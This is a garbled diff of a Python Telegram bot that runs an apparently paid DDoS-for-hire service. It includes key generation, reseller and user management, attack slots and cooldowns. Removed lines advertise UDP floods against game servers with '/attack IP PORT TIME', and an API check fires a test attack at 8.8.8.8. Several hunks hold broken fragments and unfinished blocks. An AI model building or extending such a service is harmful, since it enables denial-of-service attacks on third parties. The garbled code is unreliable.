@@ -347,26 +347,25 @@ def status(msg):
     if slot1_free:
         status_msg += "✅ SLOT 1: FREE\n"
     else:
-        status_msg += f"❌ SLOT 1: BUSY\n{slot1_info}\n"
+        status_msg += "❌ SLOT 1: BUSY\n" + slot1_info + "\n"
     
     status_msg += "\n"
     
     if slot2_free:
         status_msg += "✅ SLOT 2: FREE\n"
     else:
-        status_msg += f"❌ SLOT 2: BUSY\n{slot2_info}\n"
+        status_msg += "❌ SLOT 2: BUSY\n" + slot2_info + "\n"
     
     user_active = check_user_active_attacks(uid)
-    status_msg += f"\n📊 YOUR ACTIVE: {user_active}/{MAX_CONCURRENT}"
+    status_msg += "\n📊 YOUR ACTIVE: " + str(user_active) + "/" + str(MAX_CONCURRENT)
     
     if uid in cooldown:
         remaining = 30 - (time.time() - cooldown[uid])
         if remaining > 0:
-            status_msg += f"\n⏳ YOUR COOLDOWN: {int(remaining)}s"
+            status_msg += "\n⏳ YOUR COOLDOWN: " + str(int(remaining)) + "s"
     
     bot.reply_to(msg, status_msg)
 
-attack access"""
 @bot.message_handler(commands=['genkey'])
 def genkey(msg):
     uid = str(msg.chat.id)
@@ -407,14 +406,7 @@ def genkey(msg):
     
     expiry_str = expires_at.strftime('%Y-%m-%d %H:%M:%S')
     
-    bot.reply_to(msg, f"""✅ KEY GENERATED!
-
-🔑 Key: {key}
-⏰ Duration: {days} Day(s)
-📅 Expires: {expiry_str}
-
-Share this key with user!
-User: /redeem {key}""")
+    bot.reply_to(msg, "✅ KEY GENERATED!\n\n🔑 Key: " + key + "\n⏰ Duration: " + str(days) + " Day(s)\n📅 Expires: " + expiry_str + "\n\nShare this key with user!\nUser: /redeem " + key)
 
 @bot.message_handler(commands=['removekey'])
 def remove_key(msg):
@@ -438,7 +430,7 @@ def remove_key(msg):
     del keys_data[key]
     save_keys(keys_data)
     
-    bot.reply_to(msg, f"✅ KEY REMOVED!\nKey: {key}")
+    bot.reply_to(msg, "✅ KEY REMOVED!\nKey: " + key)
 
 @bot.message_handler(commands=['add'])
 def add_user(msg):
@@ -460,18 +452,14 @@ def add_user(msg):
         return
     
     if new_user in users:
-        bot.reply_to(msg, f"❌ User {new_user} already has access!")
+        bot.reply_to(msg, "❌ User already has access!")
         return
     
     users.append(new_user)
     users_data["users"] = users
     save_users(users_data)
     
-        bot.reply_to(msg, f"""✅ USER ADDED!
-
-👤 User: {new_user}
-✅ Now has attack access!
-⚡ Concurrent Attacks: 2""")
+    bot.reply_to(msg, "✅ USER ADDED!\n\n👤 User: " + new_user + "\n✅ Now has attack access!\n⚡ Concurrent Attacks: 2")
     
     try:
         bot.send_message(new_user, "✅ You have been granted attack access!\nUse /start to see commands")
@@ -498,7 +486,7 @@ def remove_user(msg):
         return
     
     if target_user not in users:
-        bot.reply_to(msg, f"❌ User {target_user} not found!")
+        bot.reply_to(msg, "❌ User not found!")
         return
     
     users.remove(target_user)
@@ -518,136 +506,13 @@ def remove_user(msg):
     if target_user in cooldown:
         del cooldown[target_user]
     
-    bot.reply_to(msg, f"""✅ USER REMOVED!
-
-👤 User: {target_user}
-❌ Attack access revoked!""")
+    bot.reply_to(msg, "✅ USER REMOVED!\n\n👤 User: " + target_user + "\n❌ Attack access revoked!")
     
     try:
         bot.send_message(target_user, "⚠️ Your attack access has been revoked by owner!")
     except:
         pass
 
-
-    !\nTarget: {target}\nAttacker: {info['user']}")
-            
-            try:
-                bot.send_message(info['user'], f"⚠️ Your attack on {target} was stopped!")
-            except:
-                pass
-            break
-    
-    if not stopped:
-        bot.reply_to(msg, f"❌ No attack found on {target}")
-
-@bot.message_handler(commands=['methods'])
-def methods(msg):
-    uid = str(msg.chat.id)
-    
-    if uid not in users and uid not in ADMIN_ID and uid not in resellers:
-        bot.reply_to(msg, "❌ Unauthorized!")
-        return
-    
-    bot.reply_to(msg, """⚡ UDP AUTO ATTACK
-
-💡 Best for gaming (BGMI, Minecraft)
-🎯 Recommended ports: 443, 8080, 14000
-
-USAGE:
-/attack IP PORT TIME
-
-Example: /attack 1.1.1.1 443 60""")
-
-@bot.message_handler(commands=['stats'])
-def stats(msg):
-    uid = str(msg.chat.id)
-    
-    if uid not in users and uid not in ADMIN_ID and uid not in resellers:
-        bot.reply_to(msg, "❌ Unauthorized!")
-        return
-    
-    user_active = check_user_active_attacks(uid)
-    has_active = check_user_expiry(uid)
-    
-    stats_msg = f"""📊 YOUR STATS
-
-👤 ID: {uid}
-✅ Status: {'Active' if has_active else 'Expired'}
-💪 Active: {user_active}/{MAX_CONCURRENT}
-⏰ Cooldown: {'Yes' if uid in cooldown else 'No'}"""
-    
-    bot.reply_to(msg, stats_msg)
-
-@bot.message_handler(commands=['help'])
-def help_cmd(msg):
-    uid = str(msg.chat.id)
-    
-    if uid in ADMIN_ID:
-        bot.reply_to(msg, """🔥 OWNER HELP
-
-/attack IP PORT TIME - Launch attack
-/status - Check slots
-/methods - Attack methods
-/stats - Your stats
-/genkey 1 - Generate 1 day key
-/removekey KEY - Remove key
-/add USER_ID - Add user
-/remove USER_ID - Remove user
-/addreseller USER_ID - Add reseller
-/removereseller USER_ID - Remove reseller
-/broadcast MSG - Broadcast message
-/stopattack IP:PORT - Stop attack
-/allusers - List all users
-/api_status - API status""")
-    elif uid in resellers:
-        bot.reply_to(msg, """🔥 RESELLER HELP
-
-/attack IP PORT TIME - Launch attack
-/status - Check slots
-/methods - Attack methods
-/stats - Your stats
-/genkey 1 - Generate 1 day key
-/mykeys - Your generated keys""")
-    elif uid in users:
-        bot.reply_to(msg, """🔥 USER HELP
-
-/attack IP PORT TIME - Launch attack
-/status - Check slots
-/methods - Attack methods
-/stats - Your stats
-/redeem KEY - Activate key""")
-    else:
-        bot.reply_to(msg, "❌ Unauthorized! Use /redeem KEY")
-
-@bot.message_handler(commands=['allusers'])
-def all_users(msg):
-    if str(msg.chat.id) not in ADMIN_ID:
-        bot.reply_to(msg, "❌ Owner only!")
-        return
-    
-    user_list = []
-    for u in users:
-        if u in ADMIN_ID:
-            role = "👑 OWNER"
-        elif u in resellers:
-            role = "💎 RESELLER"
-        else:
-            role = "👤 USER"
-        user_list.append(f"{role}: {u}")
-    
-    bot.reply_to(msg, f"📋 ALL USERS:\n{chr(10).join(user_list)}\n\nTotal: {len(users)}\nResellers: {len(resellers)}")
-
-@bot.message_handler(commands=['api_status'])
-def api_status(msg):
-    if str(msg.chat.id) not in ADMIN_ID:
-        bot.reply_to(msg, "❌ Owner only!")
-        return
-    
-    try:
-        test_response = requests.get(f"{API_URL}?api_key={API_KEY}&target=8.8.8.8&port=80&time=5&concurrent=1", timeout=5)
-        status = f"✅ API: {'Online' if test_response.status_code == 200 else 'Offline'}\nActive Attacks: {len(active_attacks)}"
-        bot.reply_to(msg, status)
-    except:
 @bot.message_handler(commands=['addreseller'])
 def add_reseller(msg):
     uid = str(msg.chat.id)
